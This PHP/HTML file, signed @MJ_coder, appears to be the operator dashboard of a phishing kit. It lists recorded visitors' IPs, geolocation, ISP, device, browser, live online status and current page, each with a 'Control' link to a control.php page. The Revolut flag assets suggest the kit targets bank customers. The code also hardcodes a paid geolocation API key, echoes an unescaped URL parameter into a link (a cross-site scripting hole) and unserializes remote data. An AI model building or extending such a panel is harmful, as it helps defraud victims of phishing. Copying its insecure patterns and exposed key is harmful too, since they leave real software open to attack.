<?php
    include "./Assets/php/config/config.php";

    // Load all visitors IPs
    $visitors_ips = json_decode(@file_get_contents("./data/visitors.json"), true);
    if (!is_array($visitors_ips)) $visitors_ips = [];

    // Load device/browser data
    $user_data = json_decode(@file_get_contents("./data/user.json"), true);
    if (!is_array($user_data)) $user_data = [];

    // Load online status
    $status_data = json_decode(@file_get_contents("./status/visitors_status.json"), true);
    if (!is_array($status_data)) $status_data = [];

    // For each IP get geo info (cached to avoid slow load)
    $geo_cache_file = "./data/geo_cache.json";
    $geo_cache = json_decode(@file_get_contents($geo_cache_file), true);
    if (!is_array($geo_cache)) $geo_cache = [];

    foreach ($visitors_ips as $ip) {
        if (!isset($geo_cache[$ip])) {
            $raw = @file_get_contents("https://pro.ip-api.com/php/{$ip}?key=UO8wl6MQD2zPxmf&fields=status,country,countryCode,city,isp,query");
            $info = $raw ? @unserialize($raw) : [];
            if (!is_array($info) || !isset($info['countryCode'])) {
                $info = ['country' => 'Unknown', 'countryCode' => 'xx', 'city' => 'Unknown', 'isp' => 'Unknown', 'query' => $ip];
            }
            $geo_cache[$ip] = $info;
            file_put_contents($geo_cache_file, json_encode($geo_cache, JSON_PRETTY_PRINT));
        }
    }
?>
<!DOCTYPE html>
<html lang="en" class="dark">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Visitors — @MJ_coder</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script>
        tailwind.config = {
            darkMode: 'class',
            theme: {
                extend: {
                    fontFamily: { sans: ['Inter', 'sans-serif'] },
                    colors: {
                        dark: '#0B0F19',
                    }
                }
            }
        }
    </script>
    <style>
        body {
            background-color: #0B0F19;
            background-image:
                radial-gradient(circle at 20% 0%, rgba(99,102,241,0.18) 0%, transparent 50%),
                radial-gradient(circle at 80% 100%, rgba(236,72,153,0.15) 0%, transparent 50%);
            background-attachment: fixed;
            color: #e2e8f0;
        }
        .glass {
            background: rgba(30,41,59,0.45);
            backdrop-filter: blur(14px);
            -webkit-backdrop-filter: blur(14px);
            border: 1px solid rgba(255,255,255,0.07);
            border-radius: 16px;
        }
        ::-webkit-scrollbar { width: 6px; }
        ::-webkit-scrollbar-track { background: #0B0F19; }
        ::-webkit-scrollbar-thumb { background: #334155; border-radius: 4px; }
        tr:hover td { background: rgba(255,255,255,0.025); }
    </style>
</head>
<body class="min-h-screen font-sans antialiased text-slate-300 pb-16">

    <!-- Header -->
    <header class="w-full max-w-7xl mx-auto px-4 pt-8 pb-6">
        <div class="glass p-5 flex flex-col sm:flex-row items-center justify-between gap-4 relative overflow-hidden">
            <div class="absolute -top-20 -left-20 w-48 h-48 bg-indigo-500 rounded-full filter blur-[80px] opacity-20 mix-blend-screen pointer-events-none"></div>

            <div class="flex items-center gap-4 z-10">
                <div class="w-12 h-12 rounded-xl bg-indigo-500/20 flex items-center justify-center border border-indigo-500/30 text-indigo-400 text-xl">
                    <i class="ri-group-line"></i>
                </div>
                <div>
                    <p class="text-slate-400 text-xs uppercase tracking-widest font-semibold">All Visitors</p>
                    <h1 class="text-2xl font-bold text-white">
                        <?php echo count($visitors_ips); ?> <span class="text-indigo-400">recorded</span>
                    </h1>
                </div>
            </div>

            <div class="flex items-center gap-3 z-10">
                <a href="control.php?ip=<?php echo $_GET['ip'] ?? '127.0.0.1'; ?>" class="flex items-center gap-2 text-sm text-slate-400 hover:text-white border border-slate-700 hover:border-slate-500 px-4 py-2 rounded-lg transition-all">
                    <i class="ri-arrow-left-line"></i> Back to Panel
                </a>
                <button onclick="location.reload()" class="flex items-center gap-2 text-sm bg-indigo-600 hover:bg-indigo-500 text-white px-4 py-2 rounded-lg transition-all font-semibold">
                    <i class="ri-refresh-line"></i> Refresh
                </button>
            </div>
        </div>
    </header>

    <!-- Stats Bar -->
    <div class="w-full max-w-7xl mx-auto px-4 mb-6 grid grid-cols-2 sm:grid-cols-4 gap-4">
        <?php
            $online_count = 0;
            $now = time();
            foreach ($visitors_ips as $ip) {
                $st = $status_data[$ip] ?? null;
                if ($st && isset($st['last_update']) && ($now - $st['last_update']) < 15 && ($st['status'] ?? '') === 'online') {
                    $online_count++;
                }
            }
            $countries = [];
            foreach ($visitors_ips as $ip) {
                $cc = $geo_cache[$ip]['country'] ?? 'Unknown';
                $countries[$cc] = ($countries[$cc] ?? 0) + 1;
            }
        ?>
        <div class="glass p-4 flex items-center gap-3">
            <div class="w-10 h-10 rounded-xl bg-emerald-500/20 flex items-center justify-center text-emerald-400 text-lg"><i class="ri-wifi-line"></i></div>
            <div>
                <p class="text-xs text-slate-400 uppercase tracking-wider">Online Now</p>
                <p class="text-2xl font-bold text-emerald-400"><?php echo $online_count; ?></p>
            </div>
        </div>
        <div class="glass p-4 flex items-center gap-3">
            <div class="w-10 h-10 rounded-xl bg-indigo-500/20 flex items-center justify-center text-indigo-400 text-lg"><i class="ri-user-line"></i></div>
            <div>
                <p class="text-xs text-slate-400 uppercase tracking-wider">Total</p>
                <p class="text-2xl font-bold text-white"><?php echo count($visitors_ips); ?></p>
            </div>
        </div>
        <div class="glass p-4 flex items-center gap-3">
            <div class="w-10 h-10 rounded-xl bg-rose-500/20 flex items-center justify-center text-rose-400 text-lg"><i class="ri-global-line"></i></div>
            <div>
                <p class="text-xs text-slate-400 uppercase tracking-wider">Countries</p>
                <p class="text-2xl font-bold text-white"><?php echo count($countries); ?></p>
            </div>
        </div>
        <div class="glass p-4 flex items-center gap-3">
            <div class="w-10 h-10 rounded-xl bg-amber-500/20 flex items-center justify-center text-amber-400 text-lg"><i class="ri-shield-check-line"></i></div>
            <div>
                <p class="text-xs text-slate-400 uppercase tracking-wider">Offline</p>
                <p class="text-2xl font-bold text-slate-400"><?php echo count($visitors_ips) - $online_count; ?></p>
            </div>
        </div>
    </div>

    <!-- Visitors Table -->
    <main class="w-full max-w-7xl mx-auto px-4">
        <div class="glass overflow-x-auto">
            <table class="w-full text-left text-sm whitespace-nowrap">
                <thead>
                    <tr class="border-b border-white/5 text-xs uppercase tracking-widest text-slate-500 bg-white/[0.02]">
                        <th class="px-5 py-4 font-semibold">#</th>
                        <th class="px-5 py-4 font-semibold"><i class="ri-map-pin-fill mr-1"></i>IP Address</th>
                        <th class="px-5 py-4 font-semibold"><i class="ri-global-fill mr-1"></i>Country</th>
                        <th class="px-5 py-4 font-semibold"><i class="ri-building-2-line mr-1"></i>ISP</th>
                        <th class="px-5 py-4 font-semibold"><i class="ri-cpu-line mr-1"></i>Device</th>
                        <th class="px-5 py-4 font-semibold"><i class="ri-chrome-line mr-1"></i>Browser</th>
                        <th class="px-5 py-4 font-semibold"><i class="ri-time-line mr-1"></i>Last Seen</th>
                        <th class="px-5 py-4 font-semibold"><i class="ri-circle-fill mr-1"></i>Status</th>
                        <th class="px-5 py-4 font-semibold">Action</th>
                    </tr>
                </thead>
                <tbody class="divide-y divide-white/[0.04]">
                <?php
                $i = 1;
                // Sort: online first
                usort($visitors_ips, function($a, $b) use ($status_data, $now) {
                    $aOnline = isset($status_data[$a]) && ($now - ($status_data[$a]['last_update'] ?? 0)) < 15 && ($status_data[$a]['status'] ?? '') === 'online';
                    $bOnline = isset($status_data[$b]) && ($now - ($status_data[$b]['last_update'] ?? 0)) < 15 && ($status_data[$b]['status'] ?? '') === 'online';
                    return $bOnline - $aOnline;
                });

                foreach ($visitors_ips as $ip):
                    $geo   = $geo_cache[$ip] ?? [];
                    $cc    = strtolower($geo['countryCode'] ?? 'xx');
                    $country = $geo['country'] ?? 'Unknown';
                    $city  = $geo['city'] ?? '';
                    $isp   = $geo['isp'] ?? 'Unknown';

                    $dev   = $user_data[$ip] ?? [];
                    $device  = $dev['device'] ?? 'Unknown';
                    $browser = $dev['browser'] ?? 'Unknown';
                    $lastSeen = $dev['time'] ?? '—';

                    $st = $status_data[$ip] ?? null;
                    $isOnline = $st && isset($st['last_update']) && ($now - $st['last_update']) < 15 && ($st['status'] ?? '') === 'online';
                    $curPage = $st['current_page'] ?? '—';

                    // device icon
                    $devIcon = $device === 'Mobile' ? 'ri-smartphone-line' : ($device === 'Tablet' ? 'ri-tablet-line' : 'ri-computer-line');
                    // browser icon
                    $brIcon = match(strtolower($browser)) {
                        'chrome'  => 'ri-chrome-fill',
                        'firefox' => 'ri-firefox-fill',
                        'safari'  => 'ri-safari-fill',
                        'opera'   => 'ri-opera-fill',
                        default   => 'ri-global-fill'
                    };
                ?>
                <tr class="transition-colors cursor-pointer" onclick="window.location='control.php?ip=<?php echo urlencode($ip); ?>'">
                    <td class="px-5 py-4 text-slate-500 font-mono text-xs"><?php echo $i++; ?></td>
                    <td class="px-5 py-4">
                        <span class="font-mono text-white font-semibold text-sm"><?php echo htmlspecialchars($ip); ?></span>
                        <?php if($city): ?><br><span class="text-xs text-slate-500"><?php echo htmlspecialchars($city); ?></span><?php endif; ?>
                    </td>
                    <td class="px-5 py-4">
                        <div class="flex items-center gap-2">
                            <img src="https://assets.revolut.com/assets/flags/<?php echo $cc; ?>@2x.webp"
                                 onerror="this.src='https://flagcdn.com/24x18/<?php echo $cc; ?>.png'"
                                 class="w-6 h-auto rounded-sm shadow" alt="<?php echo $country; ?>">
                            <span class="text-slate-200 font-medium"><?php echo htmlspecialchars($country); ?></span>
                        </div>
                    </td>
                    <td class="px-5 py-4 text-slate-400 text-xs max-w-[160px] truncate"><?php echo htmlspecialchars($isp); ?></td>
                    <td class="px-5 py-4">
                        <span class="flex items-center gap-1.5 text-slate-300">
                            <i class="<?php echo $devIcon; ?> text-base text-slate-400"></i>
                            <span class="text-xs"><?php echo htmlspecialchars($device); ?></span>
                        </span>
                    </td>
                    <td class="px-5 py-4">
                        <span class="flex items-center gap-1.5 text-slate-300">
                            <i class="<?php echo $brIcon; ?> text-base text-blue-400"></i>
                            <span class="text-xs"><?php echo htmlspecialchars($browser); ?></span>
                        </span>
                    </td>
                    <td class="px-5 py-4 text-slate-500 text-xs font-mono"><?php echo htmlspecialchars($lastSeen); ?></td>
                    <td class="px-5 py-4">
                        <?php if ($isOnline): ?>
                            <div class="flex items-center gap-1.5">
                                <span class="relative flex h-2.5 w-2.5">
                                    <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
                                    <span class="relative inline-flex rounded-full h-2.5 w-2.5 bg-emerald-500"></span>
                                </span>
                                <span class="text-emerald-400 font-semibold text-xs">Online</span>
                            </div>
                            <p class="text-xs text-slate-500 mt-0.5 max-w-[120px] truncate">📄 <?php echo htmlspecialchars($curPage); ?></p>
                        <?php else: ?>
                            <div class="flex items-center gap-1.5">
                                <span class="w-2.5 h-2.5 rounded-full bg-slate-600"></span>
                                <span class="text-slate-500 text-xs">Offline</span>
                            </div>
                        <?php endif; ?>
                    </td>
                    <td class="px-5 py-4">
                        <a href="control.php?ip=<?php echo urlencode($ip); ?>"
                           onclick="event.stopPropagation()"
                           class="inline-flex items-center gap-1.5 text-xs font-semibold px-3 py-1.5 rounded-lg bg-indigo-500/20 hover:bg-indigo-500/40 text-indigo-300 border border-indigo-500/30 transition-all">
                            <i class="ri-gamepad-line"></i> Control
                        </a>
                    </td>
                </tr>
                <?php endforeach; ?>
                <?php if (empty($visitors_ips)): ?>
                <tr>
                    <td colspan="9" class="px-5 py-16 text-center text-slate-500">
                        <i class="ri-ghost-line text-4xl block mb-3"></i>
                        No visitors recorded yet
                    </td>
                </tr>
                <?php endif; ?>
                </tbody>
            </table>
        </div>
    </main>

    <!-- Footer -->
    <footer class="text-center w-full mt-10">
        <p class="text-slate-600 text-xs">© 2025 <span class="text-indigo-400">@MJ_coder</span> — Auto-refresh every 10s</p>
    </footer>

    <script>
        // Auto-refresh every 10 seconds
        setTimeout(() => location.reload(), 10000);
    </script>
</body>
</html>
